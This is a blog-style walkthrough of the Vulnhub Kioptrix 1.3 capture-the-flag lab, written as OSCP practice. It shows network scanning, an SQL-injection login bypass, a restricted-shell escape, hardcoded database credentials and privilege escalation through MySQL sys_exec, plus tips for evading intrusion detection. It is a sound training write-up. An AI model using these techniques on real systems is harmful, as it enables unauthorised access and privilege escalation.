Today I'm hacking into **Kioptrix 1.3**. Or Kioptrix #4. This is one of the many **beginner-friendly OSCP-like** CTFs of Vulnhub. So it's a great starting point for preparing the OSCP tests. If you want to start with the previous level, check my walkthroughs: **[Kioptrix #1](/posts/kioptrix-1-walkthrough)** and **[Kioptrix #2](/posts/kioptrix-2-walkthrough)**.

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation
   - Gaining root access

## Tools Used

- Netdiscover
- Nmap
- Searchsploit
- Someone's exploit

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
Currently scanning: 192.168.18.0/16   |   Screen View: Unique Hosts

```
## Enumeration 

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.40
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-week-1/#port-scanning)**
{: .prompt-warning }

And the output...

We can see some interesting ports open here. 

- **Port 22:** Nothing interesting so far when trying to connect via SSH.

- **Port 80:** Let's open the browser and search for http://192.168.1.40. We find a login page, let's keep going with the recon before trying anything here.

Let's enumerate the directories of the website with `gobuster`: `sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.1.40 -t 10`. And the results show there's a directory named *john* and another named *robert*: `http://192.168.1.40/john/` & `http://192.168.1.40/robert/`.

- **Port 139/445:** Our lovely and insecure Samba ports. We are going to further enumerate Samba with Nmap: `sudo nmap --script smb-enum-users -v 192.168.1.40`.

![Samba Users](/kioptrix-smb-users.png)

Now we have some users to try to log in. Back to the login page, let's try some **SQLi**. Starting with *john* as username and the legendary `' OR '1'='1'` as the password.

![Member Page](/logged-in.png)

Yay, We have a password! Let's try to log in with SSH: 

```bash
sudo ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedAlgorithms=+ssh-rsa -c aes128-cbc john@192.168.1.40
```

And now we're in! As we can see. we don't have a full working shell, it just allows us to use a few commands and stay in `/home/john`, otherwise we would be kicked out. Now we should scape this limited shell. Thanks to the `echo` command we can log other commands into the system bypassing the restriction: 

```bash
echo os.system('/bin/bash')
```

Ok, now we have a full shell. First things first, let's check if we can run **sudo** and what is already running as **root**. Running `sudo -l` we make sure that we cannot run **sudo**. Now let's check the processes that are running as root: `ps -elf | grep 'root'`. Now we see that **MySQL** is running as **root**.

Let's head to `/var/www` and `cat` the `checklogin.php` to see if any credentials are hardcoded. And yes! Now we can access the database with the credentials with `root` as user and no password: `mysql -h localhost -u root -p`.

Now we can see what databases we have: `show databases;`. And as **MySQL** is running as root and we have root access to it, what we can do is to try to add *john* to the *admin* group: 

```sql
select sys_exec('usermod -a -G admin john')
```

To check if it worked, exit MySQL and run `sudo su`. When prompted for john's password use *MyNameIsJohn* and... voil√†! We have **root** access!
